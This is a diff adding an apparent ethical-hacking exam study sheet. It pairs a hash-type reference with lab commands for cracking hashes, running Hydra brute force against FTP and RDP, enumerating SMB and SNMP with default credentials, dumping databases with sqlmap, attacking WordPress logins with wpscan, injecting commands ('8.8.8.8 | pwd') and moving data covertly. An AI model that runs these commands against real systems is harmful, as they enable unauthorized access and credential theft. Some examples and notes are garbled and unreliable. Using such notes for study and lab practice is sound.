@@ -1,0 +1,497 @@
+# MD5
+Length: 32 hex chars
+Example: 5d41402abc4b2a76b9719d911017c592
+John: --format=raw-md5
+Hashcat: -m 0
+
+# SHA1
+Length: 40 hex chars
+Example: aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d
+John: --format=raw-sha1
+Hashcat: -m 100
+
+# SHA256
+Length: 64 hex chars
+Example: 9c56cc51b374c3ba1890f6b6e3a8f0e4d5c9d5a7c3b8a1f2d3e4f5a6b7c8d9e0
+John: --format=raw-sha256
+Hashcat: -m 1400
+
+# SHA512
+Length: 128 hex chars
+Example: cf83e1357eefb8bd...
+John: --format=raw-sha512
+Hashcat: -m 1700
+
+# NTLM
+Length: 32 hex chars
+Example: cc348bace3ddc2f1e02c4c1aa6c0e2f5
+John: --format=nt
+Hashcat: -m 1000
+
+# LM Hash
+Length: 32 hex chars, uppercase
+Example: E52CAC67419A9A224A3B108F3FA6CB6D
+John: --format=lm
+Hashcat: -m 3000
+
+# MySQL (old pre-4.1)
+Length: 16 hex chars
+Example: 5d2e19393cc5ef67
+John: --format=mysql
+Hashcat: -m 200
+
+# MySQL (>=4.1)
+Length: 41 chars, starts with "*"
+Example: *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29
+John: --format=mysql-sha1
+Hashcat: -m 300
+
+# MSSQL 2000
+Length: 34 chars, starts with 0x0100
+John: --format=mssql
+Hashcat: -m 131
+
+# MSSQL 2005+
+Length: 54 chars, starts with 0x0100
+John: --format=mssql05
+Hashcat: -m 132
+
+# Oracle
+Length: 16–24 chars
+John: --format=oracle
+Hashcat: -m 112 (Oracle H)
+Hashcat: -m 12300 (Oracle T)
+
+# bcrypt
+Length: 60 chars, starts with $2a$, $2b$, or $2y$
+Example: $2y$12$EXRkfkdmXn2gzds2SSitu...
+John: --format=bcrypt
+Hashcat: -m 3200
+
+# scrypt
+Length: variable, starts with $s0$
+John: --format=scrypt
+Hashcat: -m 8900
+
+# PBKDF2
+Length: variable, starts with $pbkdf2$
+John: --format=pbkdf2-hmac-sha256
+Hashcat: -m 10900 (SHA256), -m 12100 (SHA512)
+
+# Wordpress / Joomla (PHPass)
+Length: 34 chars, starts with $P$ or $H$
+John: --format=phpass
+Hashcat: -m 400
+
+# Unix (crypt)
+- DES: 13 chars → John: --format=descrypt | Hashcat: -m 1500
+- MD5: starts with $1$ → John: --format=md5crypt | Hashcat: -m 500
+- SHA256: starts with $5$ → John: --format=sha256crypt | Hashcat: -m 7400
+- SHA512: starts with $6$ → John: --format=sha512crypt | Hashcat: -m 1800
+
+# Cisco Type 7
+Length: variable, digits only
+John: --format=cisco7
+Hashcat: -m 5700
+
+
+
+
+
+
+netdiscover -r 192.168.1.0/24 (to discover hosts on a network)
+
+
+
+Hash Cracking Cheat Sheet
+Step 1: Identify Hash Type
+
+hash-identifier hash.txt
+hashid '$6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02.'
+
+
+Step 2: Start with RockYou Wordlist
+
+john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+Step 3: Show Cracked Results
+john --show hash.txt
+hashcat --show -m 0 hash.txt
+
+ @ hydra to brute force the ftp login @
+
+hydra -L /usr/share/wordlists/Metasploit/common users.txt -P /usr/share/wordlists/metasploitable/unix_passwords.txt 192.168.1.100 ftp
+
+in ftp server how to get a file or upload (secret.txt) using commad like
+ls,cd,put,get (first we have to make a file on local machine and the using put upload it in ftp and if we want to read a file we have to just use get)
+
+@ What to Enumerate and how to enumerate SNMP?
+
+1. Default UDP ports used by SNMP
+
+2. Identify the processes running on the target machine using Nmap scripts
+
+3. List valid community strings of the server using Nmap scripts
+
+4. List valid community strings of the server by using snmp_login Metasploit module.
+
+5. List all the interfaces of the machine. Use appropriate Nmap scripts.
+
+
+enumeration :- 
+ 
+1 :- snmp-check 192.168.1.100 (it will give you all the detailed info about snmp and processes running on it )
+
+2 :- then go to nsedoc web and find script for snmp- processes and run it
+ 
+3 :- then go to Metasploit and search snmp select (scanner/snmp/snmp_login) set requirments      
+and run.
+
+4:- for last question go to nsedoc and look for snmp-interfaces script and run it
+
+
+
+@ SMB enumeration :
+
+What to Hack?
+
+◆ Network File shares
+
+◆ Logged in Users details
+
+◆ Workgroups
+
+◆security level information
+
+◆Domains & Services
+
+
+enumeration :- 
+
+1 :- select the target check if SMB service is enbled or not, the run a script  nmap -p 445 --script smb-enum-shares 192.168.56.102
+
+2 :- it will show you the users and file paths the go to kali file maneger and the go to networks and type smb://192.168.56.102 in file path put creditials if asked
+
+3 :- then user smb enumeration use script  nmap -p 445 --script smb-enum-users --script-args smbusername=msfadmin,smbpassword=msfadmin 192.168.56.102 
+
+4 :-  then groups smb enumeration use script  nmap -p 445 --script smb-enum-groups --script-args smbusername=msfadmin,smbpassword=msfadmin 192.168.56.102 
+
+5 :- then security level smb enumeration use nmap -sC -sV -A -T4 -p445 192.168.56.102 
+
+6:-  then services smb enumeration use script  nmap -p 445 --script smb-enum-services --script-args smbusername=msfadmin,smbpassword=msfadmin 192.168.56.102 
+
+
+@ RDP service enumeration :
+
+
+How to Exploit?
+
+1. Check for running services on the target and confirm if RDP is running on any open port
+
+2. Use Metasploit to confirm the services running is RDP
+
+3. Use Hydra to brute force the login credentials
+
+4. Use and RDP tools to login into the victim's machine
+
+
+enumeration :- 
+
+1 :- select the target check if SMB service is enbled or not, the run  nmap -p3389  192.168.56.0/24 or 102(if you know the target).
+
+2 :- then use Metasploit search for rdp_scanner , show option and set all necessary option and run (it will check is RDP really open )
+
+3 :- now RDP cred brutfource  hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.56.20 rdp
+
+4 :- now create a RDP session using Xfreerdp use this xfreerdp /u:administrator /p:qwertyuiop /v:192.168.56.102:3389
+
+
+
+@ NetBIOS Enumeration Port - 137/138/139
+
+◆NBName: 137/UDP
+
+◆NBName: 137/TCP
+
+◆NBDatagram: 138/UDP
+
+◆NBSession: 139/TCP
+
+◆Network Basic Input Output System
+
+◆Facilitates and allows computer to connect over the local network, access shared resources, such as files and printers, and to find each other.
+
+
+enumeration :- 
+
+1 :- select the target use this script nmap -sV --script nbstat.nse 192.168.56.102 and done
+
+
+
+
+
+
+
+@Wireshark > Pcap File Analysis
+
+◆Pcap(Packet Capture) File Structure
+
+
+◆Filtering packets
+
+◆Follow up Streams
+
+◆Finding Files
+
+◆Finding Comments
+
+◆Search Strings
+
+-Dos Attack
+
+-DDos Attack
+
+
+
+enumeration :- 
+
+
+1:- tcp.flags.syn == 1 && tcp.flags.ack == 0 (this filter the DDOOS attack)
+
+2:- to find stream right click the packet to choose stream (http,tcp..)
+
+3:- to find hidden txt file use this http && frame contains ".txt"
+
+4:- to find comments just click note type button of bottom of your left side
+
+5:- to find string search for just press ctrl+f it will open search option
+
+6:- to find ip's that are reasposible for DOS & DDOS attack and you know the victume ip use this tshark -r capture.pcap -Y "ip.dst == 192.168.1.200" -T fields -e ip.src | sort | uniq -c | sort -nr (note;- check for ip's that have higest number of bite or size )
+
+
+
+
+@Steganography
+
+Tools :
+
+◆stegsnow - For hiding and extracting hidden data from a text file
+
+◆Openstego - For hiding and extracting hidden data from an image file
+
+◆Covert TCP - For hiding data in TCP/IP packet headers
+
+
+enumeration :-
+
+0 :- sudo dpkg -i openstego-0.8.6-1_all.deb (go to site and download tool and then install it through this) use openstego or steghide
+
+1 :- Hide a text file inside an image
+steghide embed -cf cover.jpg -ef secret.txt -sf output.jpg
+
+
+2 :- Extract hidden text from the image
+steghide extract -sf output.jpg -xf recovered.txt
+
+3 :- Text Files (SNOW)
+
+• Hide text inside whitespace
+
+stegsnow -C -m "Hidden message" -p password secret.txt > stego.txt
+stegsnow -C -p password stego.txt
+
+(hashes.com or crackstation to crack the hash)
+
+
+◆Covert TCP :
+
+1 :- first download the code GitHub covert_tcp.c (https://github.com/zaheercena/Covert-TCP-IP-Protocol)
+
+2 :- then run a command cc -o covert_tcp covert_tcp.c (run on root and install it on both machine sender & reciver machine) 
+
+3 :- on recivers machine run " ./covert_tcp -source 10.0.2.15 -source_port 8888 -server -file receive.txt
+
+4 :- on sender machine run "./covert_tcp -source 10.0.2.15 -dest 10.0.2.4 -source_port 9999 -dest_port 8888 -file secret.txt"
+
+
+@Cryptography :
+
+
+Tools :
+
+◆ Hashmyfiles- For calculating and comparing hashes of files
+
+◆ Cryptool-For encryption/decryption of the hex data - by manipulating the key length
+
+◆ BcTextEncoder-For encoding and decoding text in file (hex)
+
+◆ Cryptool-For encrypting and decrypting the files
+
+◆ VeraCrypt-For hiding and Encrypting the disk partitions
+
+
+enumeration :-
+
+◆ Hashmyfiles-
+
+1 :- download hashmyfiles tool on internet then run exe file and drop all files into it that show that which files are tempered , tempered files remain white but not tempered files become pink
+
+◆ Cryptool-
+
+1 :- download Cryptool tool on internet then run exe file and then you can encrypt/decrypt files.
+
+◆ BcTextEncoder- 
+
+1 :- download BcTextEncoder tool on internet then run exe file and then you can encode/decode text.
+
+◆ Cryptool-
+
+1 :- download Cryptool tool on internet then run exe file and then you can watch another video not clearly explain.
+
+◆ VeraCrypt-
+
+1 :- download VeraCrypt tool on internet then run exe file and then you can make a hidden partions and mount/unmount it using this tool.
+
+
+
+@Hacking Web & Android Application
+
+◆Command Injection
+
+◆SQLi
+
+◆XSS..
+
+
+
+
+Tools :
+
+◆ SQLMap - For finding SQL Injection Vulnerabilities
+
+◆ Wpscan - Scanning and Finding issues in wordpress websites
+
+◆ ADB - For connecting Android devices to PC and binary analysis
+
+◆ Burpsuite - For analysing and manipulating the traffic
+
+
+
+
+
+enumeration :-
+
+
+◆ Command Injection :
+
+1:-( ;, &&, |) use this to manuplate input fields like ex: 8.8.8.8 | pwd
+
+
+◆ SQLMap :
+
+1:- first we capture the get request and save it in req.txt using burpsuite and then use sqlmap to enumerate data base using this command sqlmap -r req.txt --dbs --batch
+
+2:- to enumerate the present database use sqlmap -r req.txt -D dvwa (database name) 
+
+3:- to see tables present into it use sqlmap -r req.txt -D dvwa  --tables
+
+4:- to know colums in that tables use sqlmap -r req.txt -D dvwa --tables -columns
+
+5:- to dump/download locally use sqlmap -r req.txt -D dvwa --dump
+
+
+◆ Wpscan :
+
+
+# Wordpress site only Users Enumeration
+wpscan --url http://example.com/ceh --enumerate u 
+
+# Direct crack if we have user/password details
+
+wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
+
+
+
+# WPScan basics
+wpscan --url http://target.com --enumerate u     # enumerate users
+wpscan --url http://target.com --enumerate p     # enumerate plugins
+wpscan --url http://target.com --enumerate t     # enumerate themes
+wpscan --url http://target.com --enumerate vp    # vulnerable plugins
+wpscan --url http://target.com --enumerate vt    # vulnerable themes
+wpscan --url http://target.com --enumerate ap    # all plugins
+wpscan --url http://target.com --enumerate at    # all themes
+
+◆ ADB :
+
+1:- to search android devices use adb devices 
+
+2:- to connect a android device use adb connect 192.168.0.100:5555
+
+3:- after connecting to get a shell use adb shell (type ls/whoami to see list to confirm it's working)
+
+
+
+
+
+
+File Modes
+
+The setuid and setgid bits are normally represented as the values:
+
+4 for setuid
+
+0 2 for setgid
+
+In the high-order octal digit of the file mode.
+
+For example, 6711 has both the setuid and setgid bits (4 + 2 = 6)
+
+6- Access Right Flags
+
+7 - Owner Permission of [Read(4) + Write(2) + Execute(1)]
+
+1 - Groups Permission of [Read(0) + Write(0) + Execute(1)]
+
+1 - Others Permission of [Read(0) + Write(0) + Execute(1)]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
